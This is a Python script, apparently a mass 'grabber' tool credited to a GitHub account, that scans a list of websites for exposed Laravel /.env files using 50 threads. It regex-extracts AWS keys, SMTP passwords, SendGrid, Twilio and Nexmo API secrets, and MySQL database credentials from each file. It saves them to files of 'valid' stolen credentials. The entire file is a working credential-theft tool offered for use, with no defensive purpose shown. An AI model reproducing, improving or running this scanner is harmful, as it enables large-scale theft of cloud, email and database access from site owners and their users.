import os
import requests as r
from re import findall as reg
from colorama import Fore, Style, Back
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Pool
import threading
import sys
bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE

def screen_clear():
    if os.name == "nt":
	    os.system("cls")
    else:
	    os.system("clear")


headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}


def get_aws(star, resp):
    try:
        if "AWS_ACCESS_KEY_ID" in resp:
            aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", resp)[0]
            aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", resp)[0]
            aws_reg = reg("\nAWS_DEFAULT_REGION=(.*?)\n", resp)[0]
            build = aws_key + '|' + aws_sec + '|' + aws_reg
            fix = build.startswith('|')
            fix2 = build.startswith('\r')
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            elif fix or fix2:
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            else:
                print(f"{star}: {gr}AWS{res}{red} | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                remover = build.replace('\r', '')
                aws = open('Results/Valid_Aws_Secret_Keys.txt', 'a')
                aws.write(remover+'\n')
                aws.close()

        elif "<td>AWS_ACCESS_KEY_ID</td>" in resp:
            aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", resp)[0]
            aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", resp)[0]
            aws_reg = reg("<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", resp)[0]
            build = aws_key + '|' + aws_sec + '|' + aws_reg
            fix = build.startswith('|')
            fix2 = build.startswith('\r')
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            elif fix or fix2:
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            else:
                print(f"{star}: {gr}AWS{res}{red} | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                remover = build.replace('\r', '')
                aws = open('Results/Valid_Aws_Secret_Keys.txt', 'a')
                aws.write(remover+'\n')
                aws.close()
        elif "AWS_KEY" in resp:
            aws_key = reg("\nAWS_KEY=(.*?)\n", resp)[0]
            aws_sec = reg("\nAWS_SECRET=(.*?)\n", resp)[0]
            aws_reg = reg("\nAWS_REGION=(.*?)\n", resp)[0]
            build = aws_key + '|' + aws_sec + '|' + aws_reg
            fix = build.startswith('|')
            fix2 = build.startswith('\r')
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            elif fix or fix2:
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            else:
                print(f"{star}: {gr}AWS{res}{red} | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                remover = build.replace('\r', '')
                aws = open('Results/Valid_Aws_Secret_Keys.txt', 'a')
                aws.write(remover+'\n')
                aws.close()
        elif "SES_KEY" in resp:
            aws_key = reg("\nSES_KEY=(.*?)\n", resp)[0]
            aws_sec = reg("\nSES_SECRET=(.*?)\n", resp)[0]
            aws_reg = reg("\nSES_REGION=(.*?)\n", resp)[0]
            build = aws_key + '|' + aws_sec + '|' + aws_reg
            fix = build.startswith('|')
            fix2 = build.startswith('\r')
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            elif fix or fix2:
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            else:
                print(f"{star}: {gr}AWS{res}{red} | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                remover = build.replace('\r', '')
                aws = open('Results/Valid_Aws_Secret_Keys.txt', 'a')
                aws.write(remover+'\n')
                aws.close()
    except:
        pass
def get_smtp(star, resp):
    try:
        if "MAIL_HOST" in resp:
            if "apikey" in resp:
                print(f"{star}: {red}AWS | SMTP | {gr}SENDGRID_API{res}{red} | TWILIO | Nexmo | MYSQL{res}\n")
                sendgriduser = reg("\nMAIL_USERNAME=(.*?)\n", resp)[0]
                sendgridpass = reg("\nMAIL_PASSWORD=(.*?)\n", resp)[0]
                builder = sendgriduser + '|' + sendgridpass
                remover = builder.replace('\r', '')
                sendgridsmtp = open('Results/Sendgrid_api.txt', 'a')
                sendgridsmtp.write(remover+'\n')
                sendgridsmtp.close()
            elif "MAIL_HOST=" in resp:
                mailhost = reg("\nMAIL_HOST=(.*?)\n", resp)[0]
                mailuser = reg("\nMAIL_USERNAME=(.*?)\n", resp)[0]
                mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", resp)[0]
                if mailuser == '' or mailpass == '' or mailuser == 'null' or mailpass == 'null' or mailuser == '""' or mailpass == '""':
                    print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                else:
                    mailport = '587'
                    build = mailhost + '|' + mailport + '|' + mailuser + '|' + mailpass
                    remover = build.replace('\r', '')
                    print(f"{star}: {red}AWS | {gr}SMTP{res}{red} | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                    smtps = open("Results/Valid_SMTPs.txt", "a")
                    smtps.write(remover+'\n')
                    smtps.close()
            elif "<td>MAIL_HOST</td>" in resp:
                mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', resp)[0]
                mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', resp)[0]
                mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', resp)[0]

                if mailuser == '' or mailpass == '' or mailuser == 'null' or mailpass == 'null' or mailuser == '""' or mailpass == '""':
                    print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                else:
                    mailport = '587'
                    build = mailhost + '|' + mailport + '|' + mailuser + '|' + mailpass
                    remover = build.replace('\r', '')
                    print(f"{star}: {red}AWS | {gr}SMTP{res}{red} | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                    smtps = open("Results/Valid_SMTPs.txt", "a")
                    smtps.write(remover+'\n')
                    smtps.close()
            else:
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
    except:
        pass

def get_nexmo(star, resp):
    try:
        if 'NEXMO' in resp:
            nexmokey = reg("\nNEXMO_KEY=(.*?)\n", resp)[0]
            nexmoapi = reg("\nNEXMO_SECRET=(.*?)\n", resp)[0]
            try:
                nexmofrom = reg("\nNEXMO_FROM=(.*?)\n", resp)[0]
            except:
                nexmofrom = ''
            try:
                nexmofrom2 = reg("\nSMS_FROM=(.*?)\n", resp)[0]
            except:
                nexmofrom2 = ''
            if nexmokey == '' or nexmoapi == '' or nexmokey == 'null' or nexmoapi == 'null' or nexmokey == '""' or nexmoapi == '""' or nexmokey == "NEXMO_KEY" or nexmoapi == "NEXMO_SECRET":
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            else:
                build = nexmokey + '|' + nexmoapi + '|' + nexmofrom + '|' + nexmofrom2
                remover = build.replace('\r', '')
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | {gr}Nexmo{res}{red} | MYSQL{res}\n")
                nexmo = open("Results/Valid_Nexmo.txt", "a")
                nexmo.write(remover+'\n')
        elif "<td>NEXMO_KEY</td>" in resp:
            nexmokey = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', resp)[0]
            nexmoapi = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', resp)[0]
            try:
                nexmofrom = reg("\nNEXMO_FROM=(.*?)\n", resp)[0]
            except:
                nexmofrom = ''
            try:
                nexmofrom2 = reg("\nSMS_FROM=(.*?)\n", resp)[0]
            except:
                nexmofrom2 = ''
            if nexmokey == '' or nexmoapi == '' or nexmokey == 'null' or nexmoapi == 'null' or nexmokey == '""' or nexmoapi == '""' or nexmokey == "NEXMO_KEY" or nexmoapi == "NEXMO_SECRET":
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            else:
                build = nexmokey + '|' + nexmoapi + '|' + nexmofrom + '|' + nexmofrom2
                remover = build.replace('\r', '')
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | {gr}Nexmo{res}{red} | MYSQL{res}\n")
                nexmo = open("Results/Valid_Nexmo.txt", "a")
                nexmo.write(remover+'\n')
        else:
             print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
    except:
        pass

def get_twillio(star, resp):
    try:
        if "TWILIO" in resp:
            if "TWILIO_API_SID" in resp:
                acc_sid = reg('<td>TWILIO_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', resp)[0]
                acc_token = reg('<td>TWILIO_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', resp)[0]
                if acc_sid == '' or acc_token == '' or acc_sid == 'null' or acc_token == 'null' or acc_sid == '""' or acc_token == '""':
                    print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                else:
                    build = acc_sid + '|' + acc_token
                    remover = build.replace('\r', '')
                    print(f"{star}: {red}AWS | SMTP | SENDGRID_API | {gr}TWILIO{res}{red} | Nexmo | MYSQL{res}\n")
                    twill = open("Results/Valid_Twilio.txt", "a")
                    twill.write(remover+'\n')
            elif "TWILIO_SID=" in resp:
                acc_key = reg("\nTWILIO_SID=(.*?)\n", resp)[0]
                acc_sec = reg("\nTWILIO_TOKEN=(.*?)\n", resp)[0]
                if acc_sid == '' or acc_token == '' or acc_sid == 'null' or acc_token == 'null' or acc_sid == '""' or acc_token == '""':
                    print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
                else:
                    build = acc_sid + '|' + acc_token
                    remover = build.replace('\r', '')
                    print(f"{star}: {red}AWS | SMTP | SENDGRID_API | {gr}TWILIO{res}{red} | Nexmo | MYSQL{res}\n")
                    twill = open("Results/Valid_Twilio.txt", "a")
                    twill.write(remover+'\n')
            else:
                print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
        else:
            print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
    except:
        pass

def get_mysql(star, resp):
    try:
        if 'DB_HOST=mysql.' in resp:
            host = reg('\nDB_HOST=(.*?)\n', resp)[0]
            port = reg('\nDB_PORT=(.*?)\n', resp)[0]
            db = reg('\nDB_DATABASE=(.*?)\n', resp)[0]
            user = reg('\nDB_USERNAME=(.*?)\n', resp)[0]
            pwd = reg('\nDB_PASSWORD=(.*?)\n', resp)[0]
            print (f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | {gr}MYSQL{res}\n")
            with open ("Results/!Valid_Mysql.txt", "a") as saved:
                saved.write(f"URL: {star}\n Host: {host}\n Port: {port}\n DB_Name: {db}\nUsername: {user}\n Password: {pwd}\n")
                saved.close()
        else:
            print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")
            pass
    except:
        print(f"{star}: {red}AWS | SMTP | SENDGRID_API | TWILIO | Nexmo | MYSQL{res}\n")

def grabb(star):
    if "://" in star:
        star = star
    else:
        star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    try:
        resp = r.get(star + "/.env", headers=headers, timeout=5).text
        if 'DB_HOST' in resp:
            get_aws(star, resp)
            get_smtp(star, resp)
            get_nexmo(star, resp)
            get_twillio(star, resp)
            get_mysql(star, resp)
        else:
            print(f"{star} : {red} NOT LARAVEL! {res}")
    except:
        pass
def nemesis():
    print(f'''
    ___  ___                _____           _     _      {wh}
    |  \/  |               |  __ \         | |   | |      {red}
    | .  . | {gr}NEMESIS{red}__ ___  | |  \/_ __ __ _| |__ | |__   ___ _ __ {ble}
    | |\/| |/ _` / __/ __| | | __| '__/ _` | '_ \| '_ \ / _ \ '__|{wh}
    | |  | | (_| \__ \__ \ | |_\ \ | | (_| | |_) | |_) |  __/ |   {yl}
    \_|  |_/\__,_|___/___/  \____/_|  \__,_|_.__/|_.__/ \___|_|{gr}
                                                      {wh} GitHub :{red} MataKucing-OFC{res}
    ''')
def main():
    star = open(sys.argv[1], 'r').readlines()
    try:
        ThreadPool = Pool(50)
        ThreadPool.map(grabb, star)
        ThreadPool.close()
        ThreadPool.join()
    except:
        pass
if __name__ == '__main__':
    screen_clear()
    nemesis()
    main()
